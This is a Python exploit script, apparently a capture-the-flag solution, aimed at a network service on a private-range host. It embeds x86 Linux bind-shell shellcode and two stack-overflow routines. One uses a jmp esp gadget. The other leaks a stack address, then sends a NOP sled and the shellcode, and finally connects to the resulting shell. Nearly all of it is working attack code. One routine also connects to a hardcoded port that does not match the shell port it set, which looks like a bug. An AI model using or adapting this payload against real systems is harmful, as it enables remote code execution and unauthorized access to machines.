__author__ = 'clu'

import struct
import sys

sys.path.append('../../../tools')

import ctf
import random

HOST = '192.168.56.101'
PORT = 2645

shell_port = random.randint(1111,65536)

bind_shellcode = (
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66"
"\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89"
"\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52"
"\x66\x68"+ struct.pack('>H', shell_port) + "\x66\x53\x89\xe1\x6a\x10"
"\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04"
"\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3"
"\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3"
"\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80"
"\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
"\xe1\x52\x89\xe2\xb0\x0b\xcd\x80"
)

return_gadget = struct.pack('I', 0x080485ba)

# ret addr
# [0] fd
# [4] buf
# [8] size
# [C] flags
send_gadget = struct.pack('I', 0x080486FC)

recv_gadget = struct.pack('I', 0x0804864C)

jump_esp_gadget = struct.pack('I', 0x08048853)

def main_1stage():
    s = ctf.connect(HOST,PORT)

    # Password?
    ctf.recv(s)
    ctf.send(s, '\n') # Doesn't matter

    ctf.recv(s)
    
    # Payload
    ctf.send(s, bind_shellcode)
    ctf.send(s, 'A' * (0x208-len(bind_shellcode)))
    ctf.send(s, 'B' * 4)
    ctf.send(s, jump_esp_gadget)
    
    shell_code_offset = 0x208 + 4 + 4
    
    
    ''' sub esp, X = 81 EC XX XX XX XX '''
    sub_stack_asm = '\x81\xEC' + struct.pack('I', shell_code_offset)
    ctf.send(s, sub_stack_asm)
    ctf.send(s, '\xFF\xE4') # jmp esp

    ctf.send(s, '\n')
    
    ctf.shell(HOST, shell_port)

# This one is pretty unreliable
def main_2stage():
    s = ctf.connect(HOST,PORT)

    # Password?
    ctf.recv(s)
    ctf.send(s, '\n') # Doesn't matter

    ctf.recv(s)
    
    # Payload
    ctf.send(s, 'A' * 0x208) # Buf
    ctf.send(s, 'B' * 4) # Saved ebp

    ctf.send(s, return_gadget * 4) # Move the sp up
    ctf.send(s, send_gadget)
    ctf.send(s, '\xDE\xAD\xD0\x0D') # just let this process die, we got what we came for
    ctf.send(s, struct.pack('I', 5)) # fd
    # A stack addr is going to be here
    # Then some size (don't care)
    # Then some flags (dont'care)
    ctf.send(s, '\n')    

    # Useless output from program
    ctf.recv(s)

    # Lets see what's on the stack
    stack_data = ctf.recv(s, recv_len=4096)

    # Nice we can see the part of the stack we've been working on

    # Pull out the address of what we just leaked
    chunks = ctf.chunks(stack_data, 4, adv=2)
    for c in chunks:
        if c == '\xDE\xAD\xD0\x0D':
            # adv the generator to the addr
            next(chunks)
            next(chunks)
            next(chunks)
            break


    leaked_addr = struct.unpack('I', next(chunks))[0]
    print("Got addr %X" % leaked_addr)

    bottom_of_original_frame = leaked_addr + 0x1e
    top_of_original_frame = bottom_of_original_frame - 0x150

    print("Bottom of original frame = %X" % bottom_of_original_frame)
    print("Top of original frame = %X" % top_of_original_frame)


    s.close() # This process has probably already died by now

    # Alright lets get some shellcode onto the stack and pop this
    s = ctf.connect(HOST,PORT)

    # Password?
    ctf.recv(s)
    ctf.send(s, '\n') # Doesn't matter

    ctf.recv(s)
    
    # Payload
    nop_sled_size=256 + 128
    
    ctf.send(s, '\x90' * nop_sled_size)
    ctf.send(s, bind_shellcode)
    ctf.send(s, 'A' * (0x208-len(bind_shellcode)-nop_sled_size))
    ctf.send(s, 'B' * 4) # Saved ebp
    ctf.send(s, struct.pack('I', top_of_original_frame)) # Thank you fork!
    ctf.send(s, '\n')
    ctf.shell(HOST, 31337)
  
if __name__ == '__main__':
    main_1stage()
